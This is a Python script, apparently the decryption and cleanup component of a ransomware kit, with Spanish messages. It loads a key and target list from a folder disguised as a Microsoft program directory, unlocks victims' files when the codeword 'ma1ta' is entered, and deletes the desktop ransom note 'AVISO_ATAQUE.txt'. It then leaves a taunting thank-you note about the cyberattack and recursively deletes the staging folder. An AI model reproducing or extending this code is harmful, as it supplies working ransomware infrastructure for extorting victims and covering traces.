import os
from os.path import abspath, dirname
import shutil

from cryptography.fernet import Fernet, MultiFernet

with open(r'C:\Program Files (x86)\Microsoft Agenda\Windows Agenda Mail\list.txt') as f:
    files = f.read().splitlines()

with open(r'C:\Program Files (x86)\Microsoft Agenda\Windows Agenda Mail\key.txt', 'rb') as f:
    key = content = f.read()

codeword = 'ma1ta'
user_phrase = input('Palabra clave: ')

count = 0

if user_phrase == codeword:
    for file in files:
        with open (file, 'rb') as f:
            content_encripted = f.read()
        if 0 == count%50:
                print(f'Files Cured {count}')
        content = Fernet(key).decrypt(content_encripted)
        with open (file, 'wb') as f:
            f.write(content)
        count += 1 

username = os.getlogin() 

threatAddress1 = fr'C:\Users\{username}\Desktop'
threatAddress2 = fr'C:\Users\{username}\OneDrive\Desktop'

eliminar1 = fr'{threatAddress1}\AVISO_ATAQUE.txt'
if os.path.isfile(eliminar1):
    os.remove(eliminar1)

eliminar2 = fr'{threatAddress2}\AVISO_ATAQUE.txt'
if os.path.isfile(eliminar2):
    os.remove(eliminar2)

contents = 'Muchas gracias por cooperar con nosotros. \n\
Esperamos de todo corazon que se lo hayan pasado tan bien como nosotros en este ciberataque. \n\
Que tengan un buen dia y recordad, la seguridad es lo mas importante. Un abrazo.'

if os.path.isdir(threatAddress1):
    with open(fr'{threatAddress1}\AGRADECIMIENTO.txt', 'w') as f:
        f.write(contents)

if os.path.isdir(threatAddress2):
    with open(fr'{threatAddress2}\AGRADECIMIENTO.txt', 'w') as f:
        f.write(contents)

eliminar3 = r'C:\Program Files (x86)\Microsoft Agenda'
shutil.rmtree(eliminar3)